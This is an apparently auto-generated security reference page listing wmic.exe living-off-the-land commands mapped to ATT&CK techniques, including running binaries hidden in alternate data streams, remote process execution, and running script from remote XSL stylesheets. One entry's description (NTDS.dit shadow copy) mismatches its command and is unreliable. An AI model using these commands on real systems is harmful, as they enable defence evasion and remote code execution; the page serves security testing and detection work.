---
parsed_by: focuslocust
source: commands
type: generated
---
# Wmic Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Wmic.exe

Tool page: [Wmic.exe](../../tools/windows/wmic.exe.md)

### Execute binary file hidden in Alternate data streams to evade defensive counter measures

```text
wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
```

Description:

Execute a .EXE file stored as an Alternate Data Stream (ADS)

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary from wmic to evade defensive counter measures

```text
wmic.exe process call create "{CMD}"
```

Description:

Execute calc from wmic

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary on a remote system

```text
wmic.exe /node:"192.168.0.1" process call create "{CMD}"
```

Description:

Execute evil.exe on the remote system.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary on remote system

```text
wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
```

Description:

Create a volume shadow copy of NTDS.dit that can be copied.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |

### Execute script from remote system

```text
wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
```

Description:

Executes JScript or VBScript embedded in the target remote XSL stylsheet.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |

### Copy file.

```text
wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
```

Description:

Copy file from source to destination.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wmic.yml` |
| Evidence | Command preserved from source parser. |
